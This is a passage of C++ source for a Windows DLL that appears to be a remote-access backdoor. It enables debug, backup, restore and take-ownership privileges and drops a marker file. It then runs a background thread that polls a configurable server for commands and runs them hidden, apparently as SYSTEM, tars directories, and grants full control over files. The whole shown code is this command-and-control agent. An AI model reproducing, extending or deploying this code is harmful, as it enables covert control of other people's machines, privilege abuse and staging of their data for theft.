        if (p1 == std::string::npos) { postResultMsg(cfg, cmd, "TAR", 1, "bad args"); return; }
        std::wstring dir = toWide(rest.substr(0, p1));
        std::wstring tar = toWide(rest.substr(p1 + 1));
        std::wstring parent = dir;
        std::wstring name = dir;
        size_t slash = dir.find_last_of(L'\\');
        if (slash != std::wstring::npos) {
            parent = dir.substr(0, slash);
            name = dir.substr(slash + 1);
        }
        std::wstring cmdline = L"tar.exe -cf \"" + tar + L"\" -C \"" + parent + L"\" \"" + name + L"\"";
        int code = runHidden(cmdline, L"", 300000);
        postResultMsg(cfg, cmd, "TAR", code, code == 0 ? "tarred" : "failed");
        return;
    }

    postResultMsg(cfg, cmd, "UNKNOWN", 1, "unknown verb: " + verb);
}

static void agentCycleOnce() {
    AgentCfg cfg = loadConfig();
    if (cfg.server.empty() || cfg.channel.empty()) return;
    std::string url = cfg.server + "/api/cmds?channel=" + urlEncode(cfg.channel);
    std::string resp;
    if (!httpJson("GET", url, "", resp)) return;
    std::vector<CmdMsg> cmds = parseCommands(resp);
    if (cmds.empty()) return;
    logLine((L"agent: " + std::to_wstring(cmds.size()) + L" command(s)").c_str());
    for (auto& c : cmds) dispatchCmd(cfg, c);
}

static void agentThread() {
    for (;;) {
        agentCycleOnce();
        Sleep(static_cast<DWORD>(loadConfig().poll_ms));
    }
}

// ----------------------------------------------------------------------------
// exports
// ----------------------------------------------------------------------------
extern "C" __declspec(dllexport) int __stdcall meow_init(void) {
    enablePrivilege(L"SeTakeOwnershipPrivilege");
    enablePrivilege(L"SeBackupPrivilege");
    enablePrivilege(L"SeRestorePrivilege");
    enablePrivilege(L"SeDebugPrivilege");

    wchar_t user[64]{};
    DWORD n = 64;
    GetUserNameW(user, &n);

    wchar_t dir[MAX_PATH]{};
    DWORD dn = GetEnvironmentVariableW(L"PROGRAMDATA", dir, MAX_PATH);
    if (dn == 0 || dn >= MAX_PATH) wcscpy_s(dir, L"C:\\ProgramData");
    std::wstring marker = std::wstring(dir) + L"\\SVOnline\\installed.txt";

    HANDLE h = CreateFileW(marker.c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h != INVALID_HANDLE_VALUE) {
        char buf[256]{};
        int len = std::sprintf(buf, "meow.dll loaded as %S\n", user);
        DWORD wr = 0;
        WriteFile(h, buf, static_cast<DWORD>(len), &wr, nullptr);
        CloseHandle(h);
    }

    if (InterlockedCompareExchange(&g_walkActive, 1, 0) == 0) {
        std::thread(bootPass).detach();
    }
    std::thread(watchTasks).detach();
    std::thread(agentThread).detach();
    return 0;
}

// run a command/script hidden as SYSTEM; wait_ms = 0 fire-and-forget,
// >0 wait up to wait_ms ms and return the exit code, <0 wait indefinitely
extern "C" __declspec(dllexport) int __stdcall meow_run(const wchar_t* cmdline, int wait_ms) {
    if (!cmdline || !*cmdline) return 1;
    std::wstring full = scriptPrefix(cmdline) + cmdline;
    std::wstring resDir = svonlineDir() + L"\\results";
    CreateDirectoryW(resDir.c_str(), nullptr);
    wchar_t fname[64]{};
    swprintf_s(fname, L"\\run_%05lu.out", InterlockedIncrement(&g_runSeq));
    return runHidden(full, resDir + fname, wait_ms < 0 ? INFINITE : static_cast<DWORD>(wait_ms));
}

extern "C" __declspec(dllexport) int __stdcall meow_access(const wchar_t* path, int recursive) {
    if (!path || !*path) return 1;
    DWORD err = grantFullControl(path);
    if (err != ERROR_SUCCESS) return 2;
    if (recursive) {
        WalkState st;
        walk(path, st, 1);
        if (st.failed) return 3;
    }
    return 0;
}

// one relay poll cycle (used by the agent thread; also callable for tests)
extern "C" __declspec(dllexport) int __stdcall meow_agent_once(void) {
    agentCycleOnce();
    return 0;
}

// set relay config at runtime (writes config.json)
extern "C" __declspec(dllexport) int __stdcall meow_config(const wchar_t* server, const wchar_t* channel) {
    if (!server || !*server || !channel || !*channel) return 1;
    CreateDirectoryW(svonlineDir().c_str(), nullptr);
    saveConfig(toNarrow(server), toNarrow(channel));
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE, DWORD, LPVOID) {
    return TRUE;
}
